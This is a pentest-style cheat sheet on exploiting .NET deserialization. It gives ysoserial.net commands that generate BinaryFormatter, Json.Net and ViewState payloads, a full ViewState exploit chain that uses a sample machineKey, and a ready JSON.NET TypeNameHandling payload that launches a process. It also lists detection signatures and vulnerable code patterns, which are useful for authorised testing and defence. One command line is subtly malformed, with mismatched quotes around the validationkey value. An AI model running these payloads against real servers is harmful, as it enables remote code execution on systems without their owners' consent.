# .NET Deserialization

## Detection
```
ViewState: starts with /wEP or /wEPDwU (base64)
BinaryFormatter: base64 "AAEAAAD/////" or hex 00 01 00 00 00 FF FF FF FF
JSON.NET with TypeNameHandling: {"$type":"..."}
```

## ysoserial.net Usage
```bash
# List gadgets
ysoserial.exe -l

# Generate payload for BinaryFormatter
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami" -o base64

# Generate payload for Json.Net
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c whoami" -o base64

# Generate payload for ViewState (requires validationKey/decryptionKey)
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  --validationalg="SHA1" --validationkey="KEY" \
  --generator="GENERATOR_VALUE" --viewstateuserkey="USERKEY" \
  -c "cmd /c whoami"
```

## Common Gadget Chains
```
WindowsIdentity
TypeConfuseDelegate
ActivitySurrogateSelector
ObjectDataProvider (with Json.Net/DataContractSerializer)
TextFormattingRunProperties (ViewState specific)
```

## ViewState Exploitation

### Requirements
```
- MAC validation must be disabled OR
- validationKey and decryptionKey must be known/leaked (machineKey)
```

### Finding machineKey (if leaked in web.config, error pages, or default keys)
```bash
# Check for known/default machineKey values
# Check error messages that leak configuration
```

### Full ViewState Exploit Chain
```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  --validationalg="SHA1" \
  --validationkey="65DE352AAA2085F30BA2A08590A1BE4B25E51288' \
  --decryptionalg="AES" \
  --decryptionkey="1A2B3C4D5E6F..." \
  --generator="B97B4E27" \
  --path="/default.aspx" \
  --apppath="/" \
  -c "whoami" \
  --islegacy
```

## JSON.NET TypeNameHandling RCE
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList",
    "$values": ["cmd", "/c calc"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  }
}
```
Only exploitable if `TypeNameHandling` is set to `Auto`, `All`, or `Objects` (not `None`).

## Common Vulnerable Patterns to Search in Decompiled Code
```csharp
BinaryFormatter.Deserialize()
JavaScriptSerializer with SimpleTypeResolver
JsonConvert.DeserializeObject(json, new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All })
XmlSerializer with untrusted type
NetDataContractSerializer.Deserialize()
LosFormatter.Deserialize()  # Used internally by ViewState
```

## Tools
```
ysoserial.net           # Gadget chain generator
ViewStatePad             # GUI ViewState decoder/encoder
Blacklist3r              # Find known machineKey values
```
